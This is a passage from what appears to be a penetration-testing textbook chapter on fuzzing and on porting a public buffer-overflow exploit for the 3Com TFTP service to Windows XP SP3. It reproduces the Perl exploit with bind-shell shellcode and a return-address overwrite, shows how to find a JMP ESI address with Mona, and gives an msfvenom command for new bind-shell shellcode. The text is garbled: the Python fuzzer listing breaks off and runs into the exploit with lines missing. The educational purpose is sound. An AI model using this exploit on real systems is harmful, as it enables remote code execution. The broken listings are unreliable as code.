flow vulnerabilities. For example, perhaps the author of the code was not
expecting anyone to enter a filename that is 1,000 characters long. After all,
who would want to type in a 1,000-character filename?
The next field is a null byte, which signifies the end of the filename. We
can’t control this field, but we can control the fourth field, Mode, which is
a user-controlled variable string. According to the RFC, TFTP’s supported
modes include netascii, octet, and mail. This is an ideal place for us to fuzz,
because developers are expecting only eight characters or less for this field.
The TFTP packet ends with a null byte to signify the end of the Mode.
Fuzzing, Porting Exploits, and Metasploit Modules 423
Attempting a Crash
For our fuzzing exercise, we will craft a succession of legitimate TFTP pack-
ets with bogus and increasingly long input in the Mode field. If the TFTP
processes the packets correctly, it should say the Mode is unrecognized and
stop processing the packet. Perhaps if we can trigger a stack-based buffer
overflow vulnerability, the results will be different, and we can cause the pro-
gram to crash. To do this, we will again write a simple Python program.
Instead of setting our buffer variable to a string of 1,100 As, as in the
War-FTP exploitation examples in Chapters 17 and 18, we’ll create an array
of strings of variable length in Listing 19-3.
#!/usr/bin/python
import socket
bufferarray = ["A"*100] u
addition = 200
while len(bufferarray)  \n\n";
exit;
}
$target = IO::Socket::INET->new(Proto=>'udp',
PeerAddr=>$ARGV[0],
PeerPort=>$ARGV[1])
or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
# win32_bind - EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
my($shellcode)= w
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x48".
"\xc8\xb3\x54\x83\xeb\xfc\xe2\xf4\xb4\xa2\x58\x19\xa0\x31\x4c\xab".
"\xb7\xa8\x38\x38\x6c\xec\x38\x11\x74\x43\xcf\x51\x30\xc9\x5c\xdf".
--snip--
"\xc3\x9f\x4f\xd7\x8c\xac\x4c\x82\x1a\x37\x63\x3c\xb8\x42\xb7\x0b".
"\x1b\x37\x65\xab\x98\xc8\xb3\x54";
print "++ Building Malicious Packet .....\n";
$nop="\x90" x 129;
$jmp_2000 = "\x0e\x08\xe5\x77";x# jmp esi user32.dll windows 2000 sp4 english
$exploit = "\x00\x02";y #write request (header)
$exploit=$exploit."A"; #file name
$exploit=$exploit."\x00"; #Start of transporting name
$exploit=$exploit.$nop;z #nop sled to land into shellcode
$exploit=$exploit.$shellcode;{ #our Hell code
$exploit=$exploit.$jmp_2000;| #jump to shellcode
$exploit=$exploit."\x00"; #end of TS mode name
print $target $exploit; #Attack on victim
print "++ Exploit packet sent ...\n";
print "++ Done.\n";
print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);
close($target);
exit;
#----------------------------------------------------------------------------------
# milw0rm.com [2007-02-28]
Listing 19-5: Public exploit for 3Com TFTP
428 Chapter 19
This exploit is written in Perl u. To use public exploits, you will need basic
reading knowledge in a number of languages. Additionally, this exploit tar-
gets Windows 2000 SP4 v, whereas our target is Windows XP SP3. We will
need to make some changes to port this exploit to our platform.
The shellcode included with this exploit claims to have been generated
using Metasploit and to open a bind shell on port 4444 w.
note No offense intended to the original author of this exploit, but in a public exploit,
always be wary of anything you can’t read. Additionally, be aware that the included
shellcode may not work for your environment. For example, it may be a reverse shell
headed to a static IP address and port. Therefore, it is good practice to use Msfvenom
to generate new, trustworthy shellcode before running any public exploit.
Reading through the exploit, we see that the author creates a TFTP
packet similar to the one we created in our fuzzing example earlier in the
chapter y. The Mode field is filled with a NOP sled of 129 characters z,
344 bytes of shellcode {, and the four-byte return address | (in this case, a JMP
ESI instruction) to redirect execution to the attacker-controlled ESI register x.
note A NOP sled is a series of no operating instructions (\x90 in hex) that do nothing and
move on. They are typically used to pad exploits. Exploit developers can just redirect
execution to somewhere in the NOP sled, and execution will just “slide” down the NOP
sled, doing nothing, until it reaches the shellcode. However, we have learned that we
can be more precise with our exploits, and we usually don’t need NOP sleds at all.
The command for the variable $jmp_2000 x tells us that the exploit uses
a JMP ESI instruction in USER32.dll on Windows 2000 SP4 English.
Finding a Return Address
Because we are using a different platform, the memory location (0x77E5080E)
of this JMP ESI instruction may be different. USER32.dll is a component of
the Windows operating system. Windows XP does not use ASLR, discussed
later in this chapter, so USER32.dll is loaded into the same memory location
on all Windows XP SP3 English platforms.
We have taken advantage of static DLL locations in our previous exploit
exercises. We need not have a copy of 3Com TFTP running to find the
memory locations of instructions in Windows components. For example,
as shown in Figure 19-4, from debugging War-FTP, we can search for a JMP
ESI instruction in USER32.dll. (It is a good idea to stick with the DLL noted
in the original exploit if we don’t have a copy of the program. We can’t be
sure the program loads MSVCRT.dll, for example.)
Of course, in our case, we have 3Com TFTP locally, but if we didn’t
have access to the app, we could use Mona to look for JMP instructions inside
a specific module. For example, we could look for instances of JMP ESI (or
the equivalent) with the command !mona jmp -r esi -m user32, as shown in
Figure 19-4.
Fuzzing, Porting Exploits, and Metasploit Modules 429
Figure 19-4: Finding JMP ESI instructions in USER32 .dll
And we find a JMP ESI instruction at the memory address 7E45AE4E in
USER32.dll on Windows XP SP3. If we change the jmp_2000 variable to this
value in little-endian format, this exploit should work for our platform.
$jmp_2000 = "\x4E\xAE\x45\x7E";
Replacing Shellcode
As noted earlier, we also need to replace the shellcode with code generated
by Msfvenom. We can use a bind shell or any Windows payload that will fit
in 344 + 129 bytes (the included shellcode plus the NOP sled). The only bad
character we need to avoid this time is the null byte. Tell Msfvenom to out-
put the payload in Perl format so we can easily add it to our exploit.
root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f perl
Editing the Exploit
Our generated shellcode from Msfvenom is 368 bytes, whereas the original
shellcode in the public exploit was 344 bytes. Now make the changes to
the original exploit code shown in Listing 19-6. We delete the NOP sled
and pad our exploit string with 105 bytes after the shellcode, so our return
address still ends up hijacking EIP.
430 Chapter 19
#!/usr/bin/perl -w
#===============================================================
# 3Com TFTP Service  \n\n";
exit;
}
$target = IO::Socket::INET->new(Proto=>'udp',
PeerAddr=>$ARGV[0],